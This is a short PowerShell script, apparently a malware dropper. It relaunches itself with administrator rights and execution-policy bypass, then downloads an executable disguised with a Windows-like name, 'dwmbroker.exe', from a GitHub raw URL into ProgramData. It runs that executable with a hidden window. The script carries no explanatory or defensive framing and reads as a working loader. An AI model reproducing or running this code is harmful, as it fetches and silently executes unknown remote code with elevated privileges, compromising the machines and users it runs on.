if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

$url = "https://github.com/AnatolyPivder/js/raw/refs/heads/main/dwmbroker.exe"

$outputPath = "$env:ProgramData\dwmbroker.exe"
(New-Object System.Net.WebClient).DownloadFile($url, $outputPath)

Start-Process -FilePath $outputPath -WindowStyle Hidden

exit
